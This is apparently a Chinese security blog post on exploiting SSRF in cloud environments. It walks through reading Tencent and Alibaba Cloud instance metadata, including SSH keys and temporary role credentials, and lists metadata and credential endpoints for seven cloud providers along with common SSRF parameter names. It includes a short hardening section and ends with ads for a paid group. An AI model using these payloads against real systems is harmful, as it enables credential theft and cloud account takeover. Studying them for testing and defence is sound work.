#  云上的ssrf漏洞挖掘技巧  
中铁13层打工人
                    中铁13层打工人  陌笙不太懂安全   2026-03-08 09:54  
  
免责声明  
```
由于传播、利用本公众号所提供的信息而造成
的任何直接或者间接的后果及损失，均由使用
者本人负责，公众号陌笙不太懂安全及作者不
为此承担任何责任，一旦造成后果请自行承担！
如有侵权烦请告知，我们会立即删除并致歉，谢谢！
```  
```
作者:中铁13层打工人
原文链接:https://forum.butian.net/index.php/share/2412
```  
## 前言：  
  
由于云厂商提供云服务均使用同一套网络边界和鉴权系统，且各云组件默认相互信任。此时一旦存在SSRF漏洞，此类边界将不复存在，攻击者可直接调用云厂商支持环境中的相应接口，因此SSRF漏洞在云环境中更具有危害性。以下文章围绕ssrf的云上利用展开。  
## 0X01 漏洞概述：  
  
SSRF全称：Server-Side  
Request Forgery，即服务器端请求伪造。  
  
攻击者可以利用该漏洞使服务器端向攻击者构造的任意域发出请求，目标通常是从外网无法访问的内部系统。SSRF 形成的原因大都是由于服务端提供了对外发起请求的功能且没有对目标地址做过滤与限制。  
  
由于元数据服务部署在链路本地地址上，云厂商并没有进一步设置安全措施来检测或阻止由实例内部发出的恶意的对元数据服务的未授权访问。攻击者可以通过实例上应用的SSRF漏洞对实例的元数据服务进行访问。因此，如果实例应用中存在SSRF漏洞，那么元数据服务将会完全暴露在攻击者面前。  
## 0X02 漏洞危害：  
  
在云服务ssrf利用中：  
  
1、攻击元数据服务：云环境中，云数据即表示实例，可以用来查看、配置甚至管理正在运行中的实例。  
  
2、攻击存储桶：攻击者通过访问元数据中存储的临时秘钥或者用于自启动实例的启动脚本，这些脚本可能会包含AK、密码、源码等等，然后根据从元数据服务获取的信息，攻击者可尝试获取到受害者账户下COS、CVM、集群等服务的权限。  
  
3、攻击Kubelet API：在云环境中，可通过Kubelet API查询集群pod和node的信息，也可通过其执行命令。（Kubernetes API 用于与集群及其各种资源进行交互。有不同的资源类型和资源实例，以API对象的形式存在。是集群的一部分，API 会指导它们在必要时执行特定操作。）  
  
4、越权攻击云平台内其他组件或服务：由于云上各组件相互信任，当云平台内某个组件或服务存在SSRF漏洞时，就可通过此漏洞越权攻击其他组件或者服务。  
## 0X03 漏洞实例—Ssrf读取腾讯云元数据  
  
在一次ssrf漏洞挖掘过程中，偶然发现该资产对应的服务器为腾讯云服务器，进一步利用尝试读取云上元数据。  
  
功能点在同步头像位置，发包中有url参数，尝试判断是否存在ssrf漏洞，将url参数改为百度，发现会返回一张图片访问链接：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQY09ibfxaqgvqfvz3b52cxtJ6pjr9NaqxEklT3Vb61Gl2G2uicCIBqDZG9gVTYyT7VicK0YL0DHclYVJyicQwV2UyrbxgZ3OPsbkQ/640?wx_fmt=png&from=appmsg "")  
  
访问发现返回的图片，内容显示为百度，判断出网。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboSTIl3RIqyzMZCUE5LibNMRAarl3MAaQEwa3eENqiaxZzjvT0xKibVdhBdQt7RHJYf7z66T2mqBU4t8Gm4yR43OdhjLzcDwb0r8Fg/640?wx_fmt=png&from=appmsg "")  
  
意味着这里会加载来自云上的图像，后查看响应发现：sever：Tencent-ci，判断为腾讯云服务器。下面开始进一步利用尝试读取元数据：  
  
将ssrf位置更换为腾讯云元数据地址：http://metadata.tencentyun.com/latest/meta-data/  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboR3ndS3voscHhWCYYnH3giblFNEqmZly0NGibGC07kavF5ux8PbKjy8IiaIRRqBXbJyWNoL7C8n5kNfUheMxicdibUxK1HI0vUW1Ln4/640?wx_fmt=png&from=appmsg "")  
  
获取meta-data列：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTXtHNmQyMU7GHxKKrsKUlmGx35ibG3HWyvJ4kic7UecBayjgibtw8klUMIfrxqOt3WsK8xxBYgyicOfKTPsibQyJnbLNeN4TCtNtVQ/640?wx_fmt=png&from=appmsg "")  
  
看到响应返回目录：public-keys/，构造链接进一步获取ssh_rsa:  
  
http://metadata.tencentyun.com/latest/meta-data/public-keys/0/openssh-key/  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboRp143TYFCiaGby7Tn6wwGdm2bN7ZTV3dWssZgxo8u6N9IWHrI3ib3UIW3dN8pVL3zCvpDFJYVHnNtjczaVbhpHRTwG6vvib9oKjo/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSYnQB5lP34j7jmFpt8sYfgRgcpRxCv1k2Lmta3UELhKrXbfPGFiaJ5gVE9iaLkQ7RFdP8ZTII5J6DC5nEWX076bkvevql9SOER4/640?wx_fmt=png&from=appmsg "")  
  
在腾讯云中还可以利用ssrf读取如下数据：  
  
1、获取实例物理所在地信息。  
  
http://metadata.tencentyun.com/latest/meta-data/placement/region  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQ8gzLg7TyMgn2sQHvTUM5WCmmr4PfbSXTynaiarT3hND3vicIxe8vTSQtbmRsBSb6Eddhjt9bx48dq3v5u6xEE6VicSTJEGnowdw/640?wx_fmt=png&from=appmsg "")  
  
2、获取实例内⽹ IP。实例存在多张⽹卡时，返回 eth0 设备的⽹络地址。  
  
http://metadata.tencentyun.com/latest/meta-data/local-ipv4  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQx3CglicHVA4AEaM014jWAeN66d48gdbyZ2DzZ44dhSB75kiaxS64KVR4bYFQbTNQZ0voIXCR2fib613PmA4Pzs3SnjtwnE98Gp8/640?wx_fmt=png&from=appmsg "")  
  
3、获取实例公⽹ IP  
  
http://metadata.tencentyun.com/latest/meta-data/public-ipv4  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboTpibOghfkUDatocA95w0Nb8qMk89Xe8Ec51kjKV7jQJPiaiaCCrcOhLcX9U4eAusvMWibEvgL09iaZibweJ13syRVYl01DicdNrQWBWU/640?wx_fmt=png&from=appmsg "")  
  
4、获取实例网络接口 VPC 网络 ID。  
  
http://metadata.tencentyun.com/network/interfaces/macs/${mac}/vpc-id  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRj5t2XhMWEUHib2HG9EDkmw0UI6ticN60HTOpTrSHuIKibGyAIgBn6zyPXbjhFdpUClNeKpaW9QRicZdqebUBz3RudLJjsicLM7QGs/640?wx_fmt=png&from=appmsg "")  
  
5、在获取到⻆⾊名称后，可以通过以下链接取⻆⾊的临时凭证，${role-name} 为 CAM 角⾊的名称：  
  
http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/${rolename}  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboRYAmm0Uiaht4oeZZHN6DDboDUO84X1Wa969FHlj1rRMen8soYxWOlyibWHKibHlq1PJa8zomib4CCp2eATNyA54wqEWRQXzu2ibep8/640?wx_fmt=png&from=appmsg "")  
## ssrf读取阿里云元数据  
  
这里是使用自己搭建的ssrf靶场环境后进行利用举例。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTnEw3cpo3D1RA7vEh09o8KXL5Aa77tAsZsfqPRKZgRTMQ3go29kzUnK08gsC7FU3cuiadPGJlib57VYWaq3f5ZAQGy5ewfH0KFI/640?wx_fmt=png&from=appmsg "")  
  
访问元数据：  
  
http://100.100.100.200/latest/meta-data  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRXfE2An92iaXzxqpah3UryySGAArgpnzC5bnia0dkyibkPN1Al3GzGWEBhZSfhyL99eBZWj8sicAX8VVUXrLHk3W5EPjbm8nArjibk/640?wx_fmt=png&from=appmsg "")  
  
在返回的结果中，可以看到当前环境存在 ram/ 目录  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSJ5udbMJVTBttLic3QTZ81mSewVy8EvHVh9wiafyHm3ROtDsp2yKrZ2fibX2WrBTiawg9yLJicfNHOm3vY9ctQweCcgmOzjcZgnf1Y/640?wx_fmt=png&from=appmsg "")  
  
说明当前云服务器配置了 RAM 角色，可以进一步获取到临时凭证。获得RAM角色的临时身份凭证，使用该安全令牌就能以RAM角色身份访问被授权的资源。  
  
访问RAM 角色的临时凭证，获取AK SK信息：  
  
http://100.100.100.200/latest/meta-data/ram/security-credentials/huocorp-terraform-goat-role  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboRgBm7PgJEib4ibIJj9ON5VHDjd2tQFfX6ZzDyxZBZ9GQ0t0ibRRzmmLHJyOAqp4pqjupEShicI23PzMJF03brFUSQyHdnbCr60ichM/640?wx_fmt=png&from=appmsg "")  
  
拿到凭证意味着可以接管云服务。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRZtU8ibP0LmEgb2Bd2I1HtwqWRRwZDsumBNrSmMttNuCFcbFuic5icoBoeEEzYAqLPemvqbicyfY19zMoUxd5iaaVSsUFo8hwOInRU/640?wx_fmt=png&from=appmsg "")  
  
不仅可以接管云主机，对云主机进行配置还可以执行命令，这里不再赘述。  
## 0X04 防御与加固  
## 云上ssrf  
  
加固模式：加固模式下，实例基于token鉴权查看实例元数据，相比普通模式对SSRF攻击有更好的防范效果。  
  
普通模式：限制用户RAM角色权限，只赋予自己所需要的权限，这样可以将影响程度降到最低。  
## 0X05 拓展  
### 一、常见元数据地址  
  
**1、AWS（**  
 **http://169.254.169.254/latest/meta-data/****）**  
  
http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories  
  
http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy  
  
http://169.254.169.254/latest/user-data  
  
http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE  
NAME]  
  
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE  
NAME]  
  
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key  
  
http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key  
  
**2、Google Cloud（**  
 **http://metadata/computeMetadata/v1/**  
 **）  
  
https://cloud.google.com/compute/docs/metadata  
```
Requires the
  header "Metadata-Flavor: Google"or"X-Google-Metadata-Request:  True" on API v1

```  
  
http://169.254.169.254/computeMetadata/v1/  
  
http://metadata.google.internal/computeMetadata/v1/  
  
http://metadata/computeMetadata/v1/  
  
http://metadata.google.internal/computeMetadata/v1/instance/hostname  
  
http://metadata.google.internal/computeMetadata/v1/instance/id  
  
http://metadata.google.internal/computeMetadata/v1/project/project-id  
  
**3、Azure（**  
 **http://169.254.169.254/metadata/instance?api-version=2017-04-02****）**  
  
https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service  
```
Header:
"Metadata: true"

```  
  
(Old)  
https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/  
  
http://169.254.169.254/metadata/instance?api-version=2017-04-02  
  
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text  
  
**4、Oracle Cloud（**  
 **http://169.254.169.254/opc/v1/instance/****）**  
  
https://docs.us-phoenix-1.oraclecloud.com/Content/Compute/Tasks/gettingmetadata.htm  
  
http://169.254.169.254/opc/v1/instance/  
  
https://docs.oracle.com/en/cloud/iaas/compute-iaas-cloud/stcsg/retrieving-instance-metadata.html  
  
http://192.0.0.192/latest/  
  
http://192.0.0.192/latest/user-data/  
  
http://192.0.0.192/latest/meta-data/  
  
http://192.0.0.192/latest/attributes/  
  
**5、阿里云（**  
 **http://100.100.100.200/latest/meta-data/****）**  
  
https://help.aliyun.com/zh/ecs/user-guide/view-instance-metadata  
  
http://100.100.100.200/latest/meta-data/[metadata](http://100.100.100.200/latest/meta-data/%3cmetadata)  
  
http://100.100.100.200/latest/meta-data/instance-id  
  
http://100.100.100.200/latest/meta-data/ram/security-credentials/  
  
http://100.100.100.200/latest/meta-data/ram/security-credentials/huocorp-terraform-goat-role  
  
**6、腾讯云（**  
 **http://metadata.tencentyun.com/latest/meta-data/****）**  
  
https://cloud.tencent.com/document/product/213/4934  
  
http://metadata.tencentyun.com/latest/meta-data/  
  
http://169.254.0.23/latest/meta-data/  
  
http://100.88.222.5/  
  
**7、华为云（**  
 **http://169.254.169.254****）**  
  
https://support.huaweicloud.com/usermanual-ecs/ecs_03_0166.html  
  
http://169.254.169.254/openstack/latest/meta_data.json  
  
http://169.254.169.254/openstack/latest/user_data  
  
http://169.254.169.254/openstack/latest/network_data.json  
  
http://169.254.169.254/openstack/latest/securitykey  
#### 二、ssrf挖掘常见场景、参数  
##### 常见场景：  
  
1、通过URL地址进行网页分享;  
  
http://share.xxx.com/index.php?url=http://www.xxx.com  
  
2、转码服务，通过URL地址把原地址的网页转换格式  
  
3、图片加载与下载，一般是通过url参数进行图片获取  
  
http://image.xxx.com/image.php?image=http://www.xxx.com  
  
4、未公开的api实现以及其他调用url的功能;  
  
5、设备后台管理进行存活测试;  
  
6、远程资源调用功能;  
  
7、数据库内置功能;  
  
8、编辑器进行远程图片抓取，如: ueditor;  
  
9、打包附件或者内容编辑并导出时  
  
10、PDF生成或导出  
##### 常见参数:  
  
share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain...  
  
  
  
后台回复  
加群  
加入交流群          
  
广告：  cisp pte/pts &nisp1级2级低价报考，货比三家不吃亏。              
  
有思路工具需要的师傅可以加入  
小圈子  
                                             
  
主要内容是（2025-2026/edusrc实战报告/思维导图/edu资产/漏洞挖掘工具/各类源码/ctf&src学习资料等）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboTQLW5X2q5ibOoTBfZeBTd8b8fCht2b9CSdmibG305NblA0TPI3kg3D8K02iaPBSEU3zpicppUFr1KrMuCWtpRIOiapFrl5J0HLV1vY/640?wx_fmt=png&from=appmsg "")  
  
部分思维导图展示（会根据自己看的报告自己学的内容进行更新但是不会是日更），其他内容可扫码查看。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/MSDUaqtwboQ0vRSQfUtaGWJ7K28K3QafSEib6NpRQTVCQCcq5qqicnzibv4cqoEEZ6cDzDaOTofjskmRMIozbRC68RgX5CBYicIJOtiayQeTT4PQ/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/MSDUaqtwboQibpWs0DjVyrica7aQ69miaHcL2g62EeroFVERMbljhHgtJADKmZa2CxiaHhBDM1Afdib1wUn2C4LD2J3T9qqNTRvt7WG2cnmMxE3M/640?wx_fmt=jpeg&from=appmsg "")  
  
其他内容懂得都懂，可以扫码查看详情，目前440多条内容，持续更新中。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/MSDUaqtwboSbY9iaDZ9UMr1zGr1VJPNmGbiadDGnY2UoCOmicw9g7CbWt5HOKNKiamG6Cr6cK3eicHSjfNibRibS9Ksqz5zIF4nVWnWtY7bMAS7bFU/640?wx_fmt=jpeg&from=appmsg "")  
  
